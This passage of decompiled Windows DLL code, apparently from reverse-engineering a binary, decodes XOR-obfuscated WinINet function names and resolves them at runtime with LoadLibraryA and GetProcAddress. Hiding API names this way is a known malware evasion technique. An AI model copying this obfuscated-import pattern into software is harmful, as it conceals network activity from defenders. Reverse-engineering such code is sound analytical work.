  local_29 = 0xd;
  local_28 = 6;
  local_27 = 0x36;
  local_26 = 0x11;
  local_25 = 0x19;
  local_24 = 0x10;
  local_23 = 0x3e;
  local_22 = 0;
  local_7c = '6';
  local_7b = 0x11;
  local_7a = 0xb;
  local_79 = 0x1a;
  local_78 = 0xd;
  local_77 = 0x11;
  local_76 = 0x1a;
  local_75 = 0xb;
  local_74 = 0x3c;
  local_73 = 0x13;
  local_72 = 0x10;
  local_71 = 0xc;
  local_70 = 0x1a;
  local_6f = 0x37;
  local_6e = 0x1e;
  local_6d = 0x11;
  local_6c = 0x1b;
  local_6b = 0x13;
  local_6a = 0x1a;
  local_69 = 0;
  local_9c = '6';
  local_9b = 0x11;
  local_9a = 0xb;
  local_99 = 0x1a;
  local_98 = 0xd;
  local_97 = 0x11;
  local_96 = 0x1a;
  local_95 = 0xb;
  local_94 = 0x2d;
  local_93 = 0x1a;
  local_92 = 0x1e;
  local_91 = 0x1b;
  local_90 = 0x39;
  local_8f = 0x16;
  local_8e = 0x13;
  local_8d = 0x1a;
  local_8c = 0;
  local_54 = '6';
  local_53 = 0x11;
  local_52 = 0xb;
  local_51 = 0x1a;
  local_50 = 0xd;
  local_4f = 0x11;
  local_4e = 0x1a;
  local_4d = 0xb;
  local_4c = 0x2c;
  local_4b = 0x1a;
  local_4a = 0xb;
  local_49 = 0x30;
  local_48 = 0xf;
  local_47 = 0xb;
  local_46 = 0x16;
  local_45 = 0x10;
  local_44 = 0x11;
  local_43 = 0x3e;
  local_42 = 0;
  local_8 = 0;
  
  
  
  FUN_100075ee(&local_88);
                    /* LPCSTR lpLibFileName for LoadLibraryA */
  hModule_10010790 = LoadLibraryA(&local_88);
  if (hModule_10010790 != (HMODULE)0x0) {
    FUN_100075ee(&local_c4);
    FUN_100075ee(&local_40);
    FUN_100075ee(&local_b0);
    FUN_100075ee(&local_68);
    FUN_100075ee(&local_30);
    FUN_100075ee(&local_7c);
    FUN_100075ee(&local_9c);
    FUN_100075ee(&local_54);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_10010770 = GetProcAddress(hModule_10010790,&local_c4);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_10010788 = GetProcAddress(hModule_10010790,&local_40);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_10010774 = GetProcAddress(hModule_10010790,&local_b0);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_10010778 = GetProcAddress(hModule_10010790,&local_68);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_1001077c = GetProcAddress(hModule_10010790,&local_30);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_10010780 = GetProcAddress(hModule_10010790,&local_7c);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_10010784 = GetProcAddress(hModule_10010790,&local_9c);
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
    _DAT_1001078c = GetProcAddress(hModule_10010790,&local_54);
    if (((((_DAT_10010770 != (FARPROC)0x0) && (_DAT_10010788 != (FARPROC)0x0)) &&
         (_DAT_10010774 != (FARPROC)0x0)) &&
        ((_DAT_10010778 != (FARPROC)0x0 && (_DAT_1001077c != (FARPROC)0x0)))) &&
       ((_DAT_10010780 != (FARPROC)0x0 &&
        ((_DAT_10010784 != (FARPROC)0x0 && (_DAT_1001078c != (FARPROC)0x0)))))) {
      iVar1 = FUN_10006f75();
      if (iVar1 != 0) goto LAB_10003401;
    }
  }
  local_20 = 0;
LAB_10003401:
  *in_FS_OFFSET = local_14;
  return local_20;
}


